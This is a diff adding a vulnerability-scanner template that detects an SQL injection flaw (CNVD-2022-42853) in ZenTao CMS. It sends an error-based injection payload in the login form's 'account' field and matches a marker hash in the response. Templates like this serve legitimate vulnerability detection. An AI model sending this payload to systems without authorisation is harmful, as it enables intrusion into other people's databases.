@@ -1,0 +1,27 @@
+id: zentao-sql-injection-cnvd-2022-42853
+
+info:
+  name: 禅道 CMS SQL 注入漏洞(CNVD-2022-42853)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: sql-injection,CNVD-2022-42853
+
+variables:
+  num: "999999999"
+
+http:
+  - raw:
+      - |
+        POST /zentao/user-login.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}/zentao/user-login.html
+
+        account=admin''+and++updatexml(1,concat(0x1,md5({{num}})),1)+and+''1''=''1
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "c8c605999f3d8352d7bb792cf3fdb25"
